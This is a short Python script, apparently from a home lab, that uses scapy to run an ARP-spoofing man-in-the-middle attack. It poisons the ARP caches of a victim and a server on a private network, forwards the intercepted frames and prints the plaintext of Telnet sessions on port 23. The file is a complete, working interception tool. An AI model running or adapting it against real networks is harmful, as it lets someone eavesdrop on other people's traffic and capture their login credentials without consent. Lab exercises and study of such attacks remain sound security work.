import scapy.all as scapy

server_ip = "192.168.56.12"
mitm_ip = "192.168.56.11"
victim_ip = "192.168.56.10"

server_mac = "08:00:27:07:f0:da"
mitm_mac = "08:00:27:e5:70:cd"
victim_mac = "08:00:27:90:ce:e9"

mitm_iface = "enp0s8"

last_client_message = ""
last_server_message = ""

def spoof():
    arp_spoof=scapy.ARP(psrc=server_ip, pdst=victim_ip, hwdst=victim_mac, op="is-at")
    scapy.send(arp_spoof, verbose=0)
    arp_spoof=scapy.ARP(psrc=victim_ip, pdst=server_ip, hwdst=server_mac, op="is-at")
    scapy.send(arp_spoof, verbose=0)

def print_packet(captured_packet, who_send_it):
    global last_client_message, last_server_message
    if scapy.Raw in captured_packet:
        try:
            payload = str(captured_packet[scapy.Raw].load, 'utf-8')
            if who_send_it == "from_client":
                last_client_message = payload
            if who_send_it == "from_server":
                last_server_message = payload
            if last_client_message != last_server_message:
                print(payload, end='')
        except Exception:
            pass

def show_sniffed(captured_packet):
    # Message from victim to mitm with server's IP
    if captured_packet[scapy.IP].dst == server_ip:
        captured_packet[scapy.Ether].src = mitm_mac
        captured_packet[scapy.Ether].dst = server_mac
        print_packet(captured_packet, "from_client")
    # Message from server to real mitm's IP
    if captured_packet[scapy.IP].dst == victim_ip:
        captured_packet[scapy.Ether].dst = victim_mac
        captured_packet[scapy.Ether].src = mitm_mac
        print_packet(captured_packet, "from_server")


    # Fix checksums
    del captured_packet.chksum
    
    # Recompute checksum
    captured_packet = captured_packet.__class__(bytes(captured_packet))

    scapy.sendp(captured_packet, iface=mitm_iface, verbose=0)
    spoof()


packet_filter = f'((ether src {victim_mac} and ip dst host {server_ip}) ' \
               f'or (ether src {server_mac} and ip dst host {victim_ip}))' \
               f' and (dst port 23 or src port 23)'
spoof()
scapy.sniff(iface=mitm_iface, prn=show_sniffed, filter=packet_filter)
